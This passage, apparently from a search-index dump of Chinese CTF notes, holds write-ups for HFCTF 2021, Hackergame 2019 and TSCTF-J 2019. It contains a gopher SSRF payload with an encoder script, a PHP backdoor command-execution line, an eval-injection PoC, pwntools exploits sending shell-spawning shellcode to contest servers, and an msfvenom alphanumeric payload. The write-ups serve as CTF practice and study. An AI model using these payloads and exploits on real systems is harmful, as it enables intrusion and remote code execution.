2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%2c%65%6e%2d%55%53%3b%71%3d%30%2e%38%2c%65%6e%3b%71%3d%30%2e%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a ``` test ``` curl gopher://127.0.0.1:2222/_%47%45%54%20%2f%3f%74%65%73%74%3d%31%32%33%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%3a%32%32%32%32%0d%0a%50%72%61%67%6d%61%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%44%4e%54%3a%20%31%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%33%2e%30%2e%34%31%30%33%2e%36%31%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%2c%65%6e%2d%55%53%3b%71%3d%30%2e%38%2c%65%6e%3b%71%3d%30%2e%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a -> HTTP/1.1 200 OK Host: 127.0.0.1:2222 Date: Tue, 26 May 2020 03:53:05 GMT Connection: close X-Powered-By: PHP/7.3.15-3 Content-type: text/html; charset=UTF-8 123 ``` 默认端口:70 编码脚本 #!/usr/bin/python # -*- coding:utf8 -*- import getopt import sys import re def togopher(): try: opts,args = getopt.getopt(sys.argv[1:], \"hf:s:\", [\"help\", \"file=\", \"stream=\"]) except: print \"\"\" Usage: python togopher.py -f python togopher.py -s python togopher.py -h \"\"\" sys.exit() if len(opts) == 0: print \"Usage: python togopher.py -h\" for opt,value in opts: if opt in (\"-h\", \"--help\"): print \"\"\" Usage: -h --help 帮助 -f --file 数据包文件名 -s --stream 从流量包中得到的字节流 \"\"\" sys.exit() if opt in (\"-f\", \"--file\"): if not value: print \"Usage: -f \" sys.exit() words = \"\" with open(value, \"r\") as f: for i in f.readlines(): for j in i: if re.findall(r'\\n', j): words += \"%0d%0a\" else: temp = str(hex(ord(j))) if len(temp) == 3: words += \"%0\" + temp[2] else: words += \"%\" + temp[2:] print words if opt in (\"-s\", \"--stream\"): if not value: print \"Usage: -s \" sys.exit() a = [value[i:i+2] for i in xrange(0, len(value), 2)] words = \"%\" + \"%\".join(a) print words if __name__ == \"__main__\": togopher() 参考资料 对万金油gopher协议的理解与应用 https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/ RESP协议 redis采取基于TCP的RESP协议进行通信 用SET命令来举例说明RESP协议的格式。 redis> SET mykey \"Hello World\" \"OK\" 实际发送的请求数据： *3\\r\\n$3\\r\\nSET\\r\\n$5\\r\\nmykey\\r\\n$5\\r\\nHello\\r\\n 实际收到的响应数据： +OK\\r\\n © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/misc.html":{"url":"library/misc.html","title":"MISC","keywords":"","body":"MISC程序语言MISC 程序语言 Rockstar jsfuck brainfuck reMorse Asciidots ArnoldC Velato Grass Game of Life ... 20 种最奇怪的编程语言:https://zhuanlan.zhihu.com/p/36829236 十大另类程序语言:http://www.matrix67.com/blog/archives/255 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/awd.html":{"url":"library/awd.html","title":"AWD","keywords":"","body":"AWDAWD ssh passwd {username} scp scp root@107.172.27.254:/home/test.txt . //下载文件 scp test.txt root@107.172.27.254:/home //上传文件 scp -r root@107.172.27.254:/home/test . //下载目录 scp -r test root@107.172.27.254:/home //上传目录 sql select \"123\" into outfile '/tmp/out.txt' 流量探测 https://github.com/wupco/weblogger © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/":{"url":"contest/","title":"Contest","keywords":"","body":"ContestContest 记录参加过的一些比赛 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/hfctf-2021.html":{"url":"contest/hfctf-2021.html","title":"2021数字中国创新大赛虎符网络安全赛","keywords":"","body":"虎符CTF20210x01 签到unsetme你会日志分析吗虎符CTF2021 0x01 签到 题目来源是一个新闻， https://www.freebuf.com/news/267983.html 看git commit可以得知我们通过 user-agentt直接进行命令执行 所以直接user-agentt: zerodiumsystem(\"cat /flag\"); 即可。 unsetme fatfree unset eval 命令拼接CVE poc: 0%0a);echo%20`cat%20/flag`;print(%27%27 得到flag 你会日志分析吗 sql盲注反推 import re from datetime import datetime f = open(\"access.log\",\"r\") raw = f.read() pattern = r\"192\\.168\\.52\\.156 - - \\[11\\/Mar\\/2021:(\\d+:\\d+:\\d+) \\+0000\\] \\\"GET \\/index\\.php\\?id=1'%20and%20if\\(ord\\(substr\\(\\(select%20flag%20from%20flllag\\),(\\d+),1\\)\\)=(\\d+),sleep\\(2\\),1\\)--\" matches = re.findall(pattern,raw) l_time = datetime.strptime(\"18:00:57\", '%H:%M:%S') i_time = datetime.strptime(\"18:00:57\", '%H:%M:%S') pos = \"\" ch =\"\" lastmatch = \"\" dic = ['0']*48 for match in matches: pos = match[1] ch = match[2] #print(chr(int(ch))) l_time = i_time i_time = datetime.strptime(match[0], '%H:%M:%S') #print((i_time-l_time).seconds) if (i_time-l_time).seconds>=2: print(i_time,l_time) print(lastmatch,match) dic[int(lastmatch[1])]=chr(int(lastmatch[2])) lastmatch = match print(''.join(dic)) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/hackergame-2019.html":{"url":"contest/hackergame-2019.html","title":"Hackergame 2019","keywords":"","body":"Hackergame2019 Log0x00 前言0x01 签到题0x02 白与夜0x03 信息安全20770x04 宇宙终极问题T1 0x04 网页读取器0x05 达拉崩吧大冒险0x06 Happy Lug0x07 正则验证器0x08 不同寻常的Python 考试0x09 小巧玲珑的ELF0x0A Shell骇客T30x0B 三教奇妙夜 0x0C 驴啃计算器 0x0D 我想要个家0x0E 没有BUG的教务系统 0x0F 参考资料 Hackergame2019 Log 0x00 前言 算是萌新第一次参加的正式CTF线上赛 题目对刚入门的小白真的挺友好的，而且的确很有趣 (凭着高超的Google+Baidu Hack技巧拿到了2500分最终水到了Rank:75) 收货： chrome javascirpt实时调试方法 Source中加断点 Shellcode的原理和使用方法 http://shell-storm.org/shellcode/shellcode数据库 pwntool 基本使用方法 nslookup 查询dns记录 ffmepg 去除重复帧 导出帧序列 Todo: 智能合约相关 Mathematica算复杂方程解 原生APK逆向。。。 Python的各种“语言漏洞” 汇编指令基础知识。。(Whitespace) cms分析 0x01 签到题 复制token+修改button标签属性去掉disabled 点击此处，获取 flag 这个故事告诉我们开发只做前端验证是万万不行的 0x02 白与夜 直接放StegSolve里flag就出来了。。。。。。。 0x03 信息安全2077 一开始想直接修改系统时间的，结果发现好像改不到2077。。。。。 Chrome F12打开Dev-Tool,在Source标签页下的(index)中 var now = new Date().toUTCString() 的下一行设置断点 运行到断点处时在Console中修改now的值 now = new Date(2077,10,15).toUTCString() 0x04 宇宙终极问题 银河系漫游指南梗。。。。。。。 T1 百度一下。。。。。。。 0x04 网页读取器 源代码核心部分 def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(\"@\") + 1:] # strip userinfo if not url.find(\"/\") == -1: url = url[:url.find(\"/\")] # strip parts after authority if not url.find(\":\") == -1: url = url[:url.find(\":\")] # strip port if url not in whitelist_hostname: return (False, \"hostname {} not in whitelist\".format(url)) return (True, \"ok\") return (False, \"scheme not in whitelist, only {} allowed\".format(whitelist_scheme)) 最后检验的url是在第一个'@'之后和第一个':'之前的 一开始翻了好久的SSRF 全都卡在@上面了。。。。。。 后来发现‘#’这个东西是页面定位的再加上‘@’后就直接可以检测的url就可以切到后面了绕过了 payload=\"http://web1/flag#@example.com:80\" 0x05 达拉崩吧大冒险 把玩了一下发现要让Attack变大 一开始仿照信息安全2077那题想直接在本地修改Money和Attack 但是看了一眼源码 $(\"#send\").click( function () { let v = $(\"#input option:selected\").val(); addMsg(\"我\", opts[parseInt(v)]); ws.send(v) } ); 每次只能上传一个“v”，数值的计算是在服务端完成的。。。。。 因为前面的v都是对话选项，尝试输入其他数都不行，卡了好久 甚至去想了怎么websocket溢出攻击。。。。。。。。 后来发现买鸡的选项没有限制 可以搞负数 然后根据整数的储存原理 注入 v=\"-3089348814741910323\" 得到 Money: 6178697629483821000 Attack: 3000000000000000000 然后挑战恶龙就完了 0x06 Happy Lug 因为一直在想域名和ip的事情 把域名本地解析到hack.lug.ustc.edu.cn的ip 然而没有什么卵用。。。。。 后来查了一下发现是绑定了TXT记录的子域名。。。。。。 nslookup -qt=txt xn--g28h.hack.ustclug.org （作为一个管理过域名的人没有想到这个知识点真的是太差劲了。。。。） 0x07 正则验证器 考察正则的回溯问题 在进行匹配的时候，匹配引擎在前面的a字符的时候，匹配成功，到达b的时候，匹配失败，就会进行回溯，而回溯的数量，和之前匹配的数量呈指数的增长趋势。 Payload RegEx:(a+)*s Strings:aaaaaaaaaaaaaaaaaaaaaaab 0x08 不同寻常的Python 考试 感谢这个题目让我知道了Python是有多么的“漏洞百出” payload1=\"\\\"Hello\\\"\" payload2=\"1,1,1.0,1\" #is 要求对象一致 这里是类型相同 payload3=\"\\\"True\\\"\" #字符串好像可以强转list和bool量？ payload4=\"[1],1\" #列表和数字乘法的不同 payload5=\"[3,2,1]\" #list(a)+[x] => [x] payload6=\"{1,2,3},{4}\" #Python set比较的奇怪方式。。。。 payload7=\"3,[3,1],[2,3]\" #列表乘法的顺序 payload8=\"[3,2,1],-6,-2\" #列表乘上负数就变空了 payload9=\"-1,6\" #显然-1的6次方是个整数而6的负一次方是个浮点数 payload10=\"\\\"x2\\\",\\\"\\\"\" #\"\"似乎也能匹配字符串末尾的字符 写不动了弃坑。。。。。。。 0x09 小巧玲珑的ELF file 一下发现是64位的ELF 拖到IDA pro里 void __noreturn start() { v0 = 102; v1 = 110; v2 = 101; v3 = 107; v4 = -125; v5 = 78; v6 = 109; v7 = 116; v8 = -123; v9 = 122; v10 = 111; v11 = 87; v12 = -111; v13 = 115; v14 = -112; v15 = 79; v16 = -115; v17 = 127; v18 = 99; v19 = 54; v20 = 108; v21 = 110; v22 = -121; v23 = 105; v24 = -93; v25 = 111; v26 = 88; v27 = 115; v28 = 102; v29 = 86; v30 = -109; v31 = -97; v32 = 105; v33 = 112; v34 = 56; v35 = 118; v36 = 113; v37 = 120; v38 = 111; v39 = 99; v40 = -60; v41 = -126; v42 = -124; v43 = -66; v44 = -69; v45 = -51; __asm { syscall; LINUX - sys_write syscall; LINUX - sys_read } for ( i = 0; i 然后异或反向搞一下就行了 for ( i = 0; i 0x0A Shell骇客 一开始没有搞明白这行代码是拿来干嘛的 ((void(*)(void))buf)(); 后来问了学长才知道相当于call $xxx ,xxx是buf里面的东西 也就是说我们要在这里放shellcode T1 先file 一下看看平台 file chall1 chall1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cdd2ffe971d1f476aa908aaa680dc36973d9115, not stripped 然后到http://shell-storm.org/shellcode/上整一个相应的shellcode 用pwntool写一个Exploit #coding=utf-8 from pwn import * context(arch = 'amd64', os = 'linux') token=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" dist=remote(\"202.38.93.241\",\"10000\") #dist=process(\"./chall1\") shellcode=\"\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05\" dist.recvuntil(\"Please input your token: \") dist.sendline(token) dist.send(shellcode) dist.interactive() T2 增加了字符过滤，只允许A-Z和0-9 怎么办呢？ 发现是32位的ELF file chall2 chall2: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2ae2aca37c13b197362f8f8709c158d20be5a983, for GNU/Linux 3.2.0, not stripped 搜索引擎找了一下发现 可以用msfvenom借助 x86/alpha_upper 的Encoder生成一个只有大写字母和数字的shellcode 注意要手动指定BufferRegister=ECX 否则生成的shellcode头部会带一下用于定位的无法用ASCii编写的shellcode msfvenom -a x86 --platform linux -p linux/x86/exec CMD=\"sh\" -e x86/alpha_upper BufferRegister=ECX -f python x86/alpha_upper 类似地用pwntool写一个Exploit #coding=utf-8 from pwn import * context(arch = 'i386', os = 'linux') token=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" dist=remote(\"202.38.93.241\",\"10002\") #dist=process(\"./chall2\") buf = b\"\" buf += b\"\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x51\\x5a\" buf += b\"\\x56\\x54\\x58\\x33\\x30\\x56\\x58\\x34\\x41\\x50\\x30\\x41\\x33\" buf += b\"\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\\x41\\x41\\x42\\x54\\x41\" buf += b\"\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x58\\x50\" buf += b\"\\x38\\x41\\x43\\x4a\\x4a\\x49\\x42\\x4a\\x44\\x4b\\x36\\x38\\x4a\" buf += b\"\\x39\\x46\\x32\\x45\\x36\\x43\\x58\\x36\\x4d\\x43\\x53\\x4c\\x49\" buf += b\"\\x4d\\x37\\x55\\x38\\x56\\x4f\\x34\\x33\\x35\\x38\\x43\\x30\\x42\" buf += b\"\\x48\\x46\\x4f\\x53\\x52\\x53\\x59\\x32\\x4e\\x4d\\x59\\x4b\\x53\" buf += b\"\\x31\\x42\\x5a\\x48\\x43\\x33\\x55\\x50\\x35\\x50\\x43\\x30\\x54\" buf += b\"\\x33\\x35\\x38\\x55\\x50\\x46\\x37\\x31\\x43\\x4b\\x39\\x4d\\x31\" buf += b\"\\x58\\x4d\\x4d\\x50\\x41\\x41\" dist.recvuntil(\"Please input your token: \") dist.sendline(token) dist.send(buf) dist.interactive() T3 一看过滤的字符更少了呀，应该直接复制一下就行了？ 但是file发现是64位的，而msfvenom中并没有对应的编码器 然后又是漫长地搜索资料时间 最后发现可以用 Github上的 shellcode_encoder来Encode 于是由从http://shell-storm.org/shellcode/整了一个相应的shellcode 写到shell.bin里 然后找到对应的地址rax+29 python2 main.py shellcode rax+29 因为其中奇奇怪怪的转义符号，最后还是手写了个脚本把字符串转成了对应的hex。。。。。。 #coding=utf-8 from pwn import * context(arch = 'amd64', os = 'linux') token=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" dist=remote(\"202.38.93.241\",\"10004\") #dist=process(\"./chall3\") shellcode=\"\\x50\\x50\\x54\\x41\\x59\\x41\\x58\\x56\\x49\\x33\\x31\\x56\\x58\\x58\\x58\\x66\\x2d\\x24\\x3f\\x66\\x2d\\x7a\\x78\\x66\\x2d\\x45\\x48\\x50\\x5a\\x54\\x41\\x59\\x41\\x58\\x56\\x49\\x33\\x31\\x56\\x58\\x50\\x50\\x5b\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x62\\x2b\\x65\\x32\\x2d\\x28\\x20\\x5f\\x60\\x35\\x3e\\x3f\\x3f\\x5f\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x49\\x4f\\x46\\x60\\x2d\\x41\\x60\\x21\\x20\\x35\\x3e\\x5f\\x37\\x3b\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x3c\\x68\\x68\\x29\\x2d\\x68\\x60\\x20\\x20\\x35\\x6e\\x3f\\x3f\\x3f\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x40\\x7b\\x23\\x27\\x2d\\x75\\x78\\x20\\x40\\x35\\x4f\\x36\\x3f\\x5f\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x40\\x23\\x36\\x70\\x2d\\x42\\x20\\x30\\x60\\x35\\x76\\x3f\\x5f\\x3f\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x32\\x20\\x75\\x40\\x2d\\x26\\x40\\x40\\x20\\x35\\x2d\\x5f\\x3f\\x77\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x53\\x58\\x2d\\x20\\x58\\x22\\x50\\x2d\\x20\\x40\\x7e\\x70\\x35\\x58\\x66\\x5f\\x3f\\x50\\x5f\\x48\\x63\\x34\\x3a\\x31\\x34\\x3a\\x53\\x58\\x2d\\x20\\x38\\x30\\x31\\x2d\\x20\\x40\\x20\\x20\\x35\\x3f\\x65\\x3f\\x3e\\x50\\x5e\\x31\\x34\\x3a\\x57\\x58\\x2d\\x3f\\x3f\\x3f\\x3f\\x2d\\x7d\\x60\\x61\\x43\\x2d\\x40\\x60\\x5f\\x7d\\x50\\x5f\\x53\\x58\\x2d\\x20\\x60\\x23\\x51\\x2d\\x40\\x60\\x7d\\x3f\\x35\\x3c\\x3e\\x5f\\x6f\\x50\\x5e\\x53\\x58\\x2d\\x79\\x60\\x62\\x42\\x2d\\x49\\x40\\x3e\\x7e\\x35\\x26\\x5f\\x5f\\x3f\\x50\\x5f\\x41\\x41\\x41\\x41\\x7a\\x5f\\x48\\x4c\\x63\\x20\\x43\\x6e\\x59\\x69\\x3f\\x6f\\x4a\\x6b\\x61\\x2a\\x5d\\x57\\x3a\\x2f\\x58\\x32\\x34\\x6a\\x7d\\x7e\\x4f\\x23\\x48\\x29\\x21\\x35\\x45\\x5a\\x31\\x70\\x67\\x7d\\x3e\\x56\\x75\\x6e\\x5d\\x3b\\x3c\\x64\\x4f\\x70\\x23\\x78\\x6c\\x26\\x4f\\x64\\x42\\x28\\x63\\x5b\\x64\\x30\\x5e\\x3f\\x2d\\x41\\x47\\x4b\\x5d\\x3f\\x66\\x39\\x31\\x41\\x75\\x77\\x29\\x6c\\x63\\x61\\x2a\\x47\\x41\\x5e\\x59\\x31\\x78\\x68\\x37\\x25\\x4f\\x2f\\x2e\\x7e\\x37\\x28\\x39\\x2d\" dist.recvuntil(\"Please input your token: \") dist.sendline(token) dist.send(shellcode) dist.interactive() 0x0B 三教奇妙夜 看了一下发现有很多相同帧 着手尝试能不能用ffmpeg把其中的相同帧分离开来 ffmpeg.exe -i output.mp4 -vf mpdecimate,setpts=N/FRAME_RATE/TB outfile.avi #删除间隔重复帧 ffmpeg.exe -i outfile.avi out.%d.jpg #导出为帧序列 然后一张张拼起来就完了 0x0C 驴啃计算器 一开始以为键盘上的都要用到 然后搜索了下发现只用三角函数嵌套是可以得到（逼近）任意有理数的 初始值为x=0x=0 可以证明让x+1x+1只需要sqrt,atan,cos,1/x,x^2sqrt,atan,cos,1/x,x​2​​ 然后x \\to 1/xx→1/x只需要1/x1/x 用连分数的方式迭代 倒过来搞就行了 Tip1:可以直接将有限小数换成分数避免精度问题 Tip2:要开long long 防止溢出负数。。。。。。。 Tip3:用Python写会不会方便一点？。。。。。 #include #include const double eps=0.00001; char begin[]=\"sqrt,\"; char end[]=\"x^2,\"; char add1[]=\"atan,cos,1/x,\"; char inv[]=\"1/x,\"; long long fac; long long fav; void solve(){ int cnt=fac/fav; fac-=fav*cnt; if(fac){ long long t=fac;fac=fav,fav=t; solve(); printf(inv); } printf(begin); while(cnt--) printf(add1); printf(end); } inline void read(){ char c; fac=0; for(c=getchar();'0' 0x0D 我想要个家 显然不能把/bin /home....删了呀 然后找了找有没有能让程序看不到根目录的方法 结果找到了虚拟一个根目录的方法 chroot mkdir /opt/chroot mkdir /opt/chroot/rbin cp /bin/bash /opt/chroot/rbin/ #放置bash 到/rbin 避开限制 cp -r /lib /opt/chroot/ #复制依赖库 cp -r /lib64 /opt/chroot/ #复制依赖库 chroot /opt/chroot /rbin/bash #运行虚拟根目录环境 然后你就会得到一个根目录符号要求的shell 由于这个shell缺少很多功能。所以你可以事先在原环境中把条件都搞定 mkdir Bedroom Kitchen Lavatory Living_Room #在“根目录”下依次创立Bedroom Kitchen Lavatory Living_Room cd Bedroom ln -s Headset Microphone #创建文件软连接 使两个文本内容一致 写一个往Clock写当前时间的脚本 #!/bin/bash while(true) do LOG_TIME=`date +%H:%M:%S` echo $LOG_TIME > Clock #sleep 1 done 再开一个终端“后台”运行这个脚本 为shell添加sleep功能 cp /bin/sleep /opt/chroot/rbin/ touch ./dev/null #调用sleep /dev/null 报错于是建之 然后运行一下题目给的脚本就完了 0x0E 没有BUG的教务系统 T1 听说是个可做题 于是下下来试着搞了一下 密码部分核心逻辑 count = read(0, temp_password, 0x9f); temp_password[count] = '\\x00'; memcpy(password, temp_password, count + 1); for (i = 0; i 关于 t[i] = (( t[i] | t[i + 1]) & ~( t[i] & t[i + 1]) | i) & ~(( t[i] | t[i + 1]) & ~( t[i] & t[i + 1]) & i); 利用德摩根反演率搞 然后发现 ( t[i] | t[i + 1]) & ~( t[i] & t[i + 1]) 是个异或 得到 t[i] = ( t[i]^t[i+1] | i) & ~( t[i]^t[i+1] & i); 这个又是个异或 得到 t[i]=t[i]^t[i+1]^i 然后还原就是 t[i]=t[i]^i^t[i+1] #include #include char str[]=\"\\x44\\x00\\x02\\x41\\x43\\x47\\x10\\x63\\x00\"; int main(){ for(int i=7;i>=0;--i) str[i]=str[i]^i^str[i+1]; for(int i=0;i 得到密码也即flag 0x0F 参考资料 shellcode: http://shell-storm.org/shellcode/ https://www.anquanke.com/post/id/85871 http://blog.eonew.cn/archives/1125#x64 http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html 如何用三角函数得出任意一个正有理数: http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/tsctf-j2019.html":{"url":"contest/tsctf-j2019.html","title":"TSCTF-J 2019","keywords":"","body":"TSCTF-J 2019 Log0x00 前言0x01 Cookie0x02 ezcrypto0x03 bypass0x04 fake_shop0x05 magic_basketball0x06 GoGoGo0x07 流量分析0x08 现场招新0x09 pwnboy0x0A shell20x0B shell10x0C largeCMS?0x0D other_world0x0E King of Kaomoji0x0F relax0x10 PNG0x11 233330x12 Name0x13 Logfile0x14 诗集0x15 Keyboard0x16 bypass-Revenge0x17 HarukaRadio0x18 CykaPredictMan0x19 不眠之夜之天气之子0x1A White And BlackTSCTF-J 2019 Log 0x00 前言 被大佬们出的“入门水题”虐爆的新生赛 最后靠着魔改的shellcode代码强行续到了一万分（汇编还是太菜） 收货： shellcode的魔改（机器码对应关系） md5前缀碰撞 php://filter/read=convert.base64-encode/resource= php任意文件读取伪协议 SSTV 慢扫描电视技术 Todo： 逆向源码分析能力 pwn reverse好难。。。。 cms 分析能力 找不到漏洞点。。。。。 SQL注入能力 sql语法不熟悉 汇编语言编程能力。。。 不会手写shellcode 0x01 Cookie 翻了一下Cookie PHPSESSION是什么东西。。。。 在form里输入会有SQL错误提示 不会盲注。。。。 0x02 ezcrypto 根据源码倒推 先rot13解码，再strrev再base64解码，再ASCII-1 得到 flag{tsctfj_easy_decode} 0x03 bypass 根据源码 绕过md5 比赛的时候一开始我只查到两种方式 数组报错 “0e”伪哈希碰撞 发现两个都过不了第二个绕过。。。。。 然后觉得第二个不好绕 看看有没有能符合第二个但是能绕过第一个的 百度一番找到了MD5构造前缀碰撞法（结果是个非预期解法） 利用fastcoll工具构造两个前缀相同md5相同但是内容不同的文件 对于其中的不可见字符进行urlencode payload: http://10.117.101.73:10004/?username=%74%73%63%74%66%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%99%3A%BB%56%79%49%46%9A%72%8B%C3%CC%FA%A6%1E%6C%9C%06%AE%38%20%9C%EB%EB%3D%3A%3C%72%47%7A%AB%E1%9E%ED%BB%EF%BC%AB%27%D9%4B%C8%C4%DB%BA%F9%F2%17%85%0E%32%DE%BB%E6%76%3C%51%F5%0B%74%06%DE%1D%B9%5B%40%F9%F6%6B%D2%C0%4B%9E%60%CC%40%27%4C%A7%DE%A9%B1%B1%18%55%E9%0A%1E%2A%0D%37%67%CA%1C%C5%CC%CD%57%33%86%B5%91%55%E5%EA%24%11%6A%92%78%0E%3F%F4%2C%00%33%9F%C3%53%F3%86%22%36%F9%63%BE%77%F0&pass=%74%73%63%74%66%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%99%3A%BB%56%79%49%46%9A%72%8B%C3%CC%FA%A6%1E%6C%9C%06%AE%B8%20%9C%EB%EB%3D%3A%3C%72%47%7A%AB%E1%9E%ED%BB%EF%BC%AB%27%D9%4B%C8%C4%DB%BA%79%F3%17%85%0E%32%DE%BB%E6%76%3C%51%F5%0B%F4%06%DE%1D%B9%5B%40%F9%F6%6B%D2%C0%4B%9E%60%CC%40%27%4C%A7%DE%A9%B1%B1%98%55%E9%0A%1E%2A%0D%37%67%CA%1C%C5%CC%CD%57%33%86%B5%91%55%E5%EA%24%11%6A%92%F8%0D%3F%F4%2C%00%33%9F%C3%53%F3%86%22%36%79%63%BE%77%F0 然后就是file_get_contents(\"/flag\");的问题 直接 file=https://example.com/233.txt 233.txt里写的是TSCTF-J{fake_flag} 因为有vps然后就直接传自己服务器上了（疯狂非预期） 实际上也可以在本机上搭一个站点环境然后读自己写的文件 实际上说不定也可用gh-pages不花一分钱传个txt。。。。。 得到flag:TSCTF-J{by4ass_1s_e4sy} 0x04 fake_shop 0x05 magic_basketball 0x06 GoGoGo 